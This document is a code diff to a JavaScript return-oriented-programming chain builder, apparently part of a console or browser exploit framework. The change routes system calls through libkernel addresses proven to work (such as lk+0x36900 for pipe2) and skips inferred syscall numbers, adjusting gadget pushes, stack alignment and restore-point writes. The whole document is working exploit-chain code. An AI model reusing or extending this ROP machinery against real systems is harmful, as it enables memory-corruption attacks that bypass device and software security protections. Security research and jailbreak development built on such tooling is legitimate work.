@@ -236,6 +236,16 @@ class rop {
            which is not enough to tell socket() apart from a blocking read().
            The numbers cost nothing to keep and name the call outright. */
         (this.syscList = this.syscList || []).push(sysc);
+        /* An address that was PROVEN by behaviour beats a number that was only
+           inferred. pipe2 is the case: the byte round trip proved lk+0x36900
+           makes a working pipe, but plain pipe() would pass that same test, so
+           it never proved the NUMBER is 0x2af -- and calling 0x2af by number
+           hangs, which says it is not. Where the address is demonstrated and
+           the number is not, jump to the address and leave rax alone. */
+        if (this.p.provenAddr && this.p.provenAddr[sysc]) {
+            this.fcall(this.p.provenAddr[sysc], rdi, rsi, rdx, rcx, r8, r9);
+            return;
+        }
         if (!this.p.syscall_insn) {
             this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
             return;
@@ -286,7 +296,8 @@ class rop {
            interchangeable, so the pad goes in front and the target keeps the
            parity it had. */
         (this.syscList = this.syscList || []).push(sysc);
-        if (this.p.syscall_insn) {
+        const proven = this.p.provenAddr && this.p.provenAddr[sysc];
+        if (!proven && this.p.syscall_insn) {
             if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
                 this.push(this.gadgets["ret"]);
             const rp = this.get_rsp();
@@ -310,11 +321,12 @@ class rop {
             this.push(this.gadgets["ret"]);
             restore_point.add32inplace(0x8);
         }
-        this.push(this.syscalls[sysc]);
+        const target = proven || this.syscalls[sysc];
+        this.push(target);
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
-        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
+        this.push_write8(restore_point.add32(0x18), target);
     }
 
    push_set_reg_from_rax(target_reg) {
@@ -450,7 +462,8 @@ class rop {
            interchangeable, so the pad goes in front and the target keeps the
            parity it had. */
         (this.syscList = this.syscList || []).push(sysc);
-        if (this.p.syscall_insn) {
+        const proven = this.p.provenAddr && this.p.provenAddr[sysc];
+        if (!proven && this.p.syscall_insn) {
             if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
                 this.push(this.gadgets["ret"]);
             const rp = this.get_rsp();
@@ -474,11 +487,12 @@ class rop {
             this.push(this.gadgets["ret"]);
             restore_point.add32inplace(0x8);
         }
-        this.push(this.syscalls[sysc]);
+        const target = proven || this.syscalls[sysc];
+        this.push(target);
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
-        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
+        this.push_write8(restore_point.add32(0x18), target);
     }
 
     push_inc8(dest, value) {
